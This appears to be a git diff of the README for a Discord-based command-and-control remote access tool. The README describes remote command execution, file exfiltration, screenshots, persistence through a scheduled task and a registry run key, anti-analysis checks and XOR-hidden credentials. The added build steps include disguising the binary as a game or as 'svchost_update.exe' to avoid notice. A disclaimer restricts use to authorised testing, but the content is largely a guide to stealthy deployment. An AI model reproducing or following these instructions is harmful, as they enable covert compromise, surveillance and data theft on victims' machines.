@@ -1,24 +1,21 @@
 # opss-terconnect
 
-Discord bot C2. Python, Nuitka-compiled Windows binary. Remote command execution, file download, screenshot, file search, and host discovery from a Discord control channel. Persistent via scheduled task + registry run key.
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-## How it works
+Discord bot C2 — Nuitka-compiled Windows binary for remote command execution, file download, screenshot capture, and file search from a Discord control channel. Persistent via scheduled task + registry run key.
+
+## Screenshots
+
+![Connected](images/connected.png)
+![Ping](images/ping.png)
+![Exec](images/exec.png)
+![Download](images/download.png)
+
+## Overview
 
 One binary per target machine. Each target runs its own Discord bot (HTTP API client) with its own token. The binary polls the Discord REST API for commands in a control channel; the matching target executes and sends results back via HTTP. On first run, the binary installs itself as a scheduled task (runs at user logon) and adds a registry run key — so it survives reboots.
 
-```python
-# Polling loop (inside each binary):
-while True:
-    messages = GET /channels/{channel_id}/messages?limit=10
-    for each new message from admin:
-        if "!exec <name> <cmd>" and name == my_hostname:
-            run cmd locally → POST result back
-        elif "!download <name> <path>" and name == my_hostname:
-            read file → POST as attachment
-        elif "!pingall":
-            POST "alive" response
-    sleep(5)
-```
+
 
 ```bash
 # Build per target
@@ -30,7 +27,7 @@ python -m nuitka --onefile --windows-console-mode-disable \
     --windows-icon-from-ico=valorant.ico VALORANT.py
 ```
 
-No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib for HTTP (`urllib`) — significantly smaller than the previous `discord.py`-based build.
+No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib (`urllib`) for HTTP — no external runtime deps in the compiled output.
 
 ## Build
 
@@ -39,10 +36,9 @@ No Discord gateway WebSocket connection. No `discord.py` dependency. The binary 
 ```bash
 # 1. Generate XOR-obfuscated config (on build machine, with real token)
 python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
+# → paste the output into VALORANT.py, replacing the placeholder lists
 
-# 2. Paste the output into VALORANT.py, replacing the placeholder lists
-
-# 3. Compile with hardening flags
+# 2. Compile
 pip install -r requirements.txt
 python -m nuitka --onefile --windows-console-mode=disable \
     --windows-icon-from-ico=valorant.ico \
@@ -52,18 +48,25 @@ python -m nuitka --onefile --windows-console-mode=disable \
     --assume-yes-for-downloads \
     VALORANT.py
 
-# 4. (Optional) Strip the binary to remove debug symbols
-#    Linux: strip VALORANT.exe
-#    Windows: use editbin /STS or similar post-build step
+# 3. (Optional) Strip debug symbols
+#    Linux:  strip VALORANT.exe
+#    Windows: editbin /STS or similar
+
+# 4. Rename to a generic name (e.g. svchost_update.exe)
+#    Process name in Task Manager = filename. Pick something boring.
 ```
 
-The token, channel ID, and admin ID are XOR-obfuscated in the source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.
+The token, channel ID, and admin ID are XOR-obfuscated in source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.
 
 ## Deploy
 
-Copy the `.exe` to the target machine. Run it. The bot connects to Discord, announces itself in the control channel, and waits for commands.
+Copy the `.exe` to the target machine. Run it. On first run the binary:
+1. Runs anti-analysis defenses (exits silently if debugger/analysis tool detected)
+2. Installs persistence (scheduled task at user logon + registry run key)
+3. Announces itself in the control channel
+4. Starts polling for commands
 
-To stop: end the process in Task Manager.
+To stop temporarily: end the process in Task Manager. Persistence remains — the binary will restart at next logon.
 
 ## Commands
 
@@ -103,30 +106,36 @@ To stop: end the process in Task Manager.
 
 End the executable in Task Manager. For full removal, send `!uninstall` in the control channel to remove persistence (the binary stays on disk), or send `!selfdestruct` to remove persistence and schedule the binary for deletion on next reboot.
 
-To manually remove persistence: delete the scheduled task named `{_PERSIST_TASK_NAME}` via Task Scheduler, and remove the corresponding entry from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+To manually remove persistence: delete the scheduled task named `WindowsSecurityCheck` via Task Scheduler, and remove the corresponding entry from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+
+## Repository structure
+
+```
+opss-terconnect/
+├── VALORANT.py          # Main bot (XOR config, anti-analysis, HTTP polling, persistence, commands)
+├── defenses.py          # Anti-debug / anti-dump helpers
+├── persistence.py       # Persistence, screenshot, file search, self-destruct
+├── token_gen.py         # CLI tool: generate XOR-obfuscated config
+├── requirements.txt     # nuitka (build tool only)
+├── .gitignore
+├── README.md
+├── images/
+│   ├── connected.png
+│   ├── ping.png
+│   ├── exec.png
+│   ├── download.png
+│   └── pwned.png
+└── valorant.ico
+```
+
+## License
+
+MIT — see [LICENSE](LICENSE).
 
 ---
 
-## Screenshots
+## ⚠️ Authorised testing and learning only
 
-**Connected**
+This tool is for authorised security testing and learning. Do not use against systems you do not have permission to test.
 
-![Connected](images/connected.png)
 
-**Ping**
-
-![Ping](images/ping.png)
-
-**Command execution**
-
-![Exec](images/exec.png)
-
-**File download**
-
-![Download](images/download.png)
-
-**Bonus**
-
-![Pwned](images/pwned.png)
-
-> My friend sent me this after recovering the token from dynamic analysis on the PyArmor build.
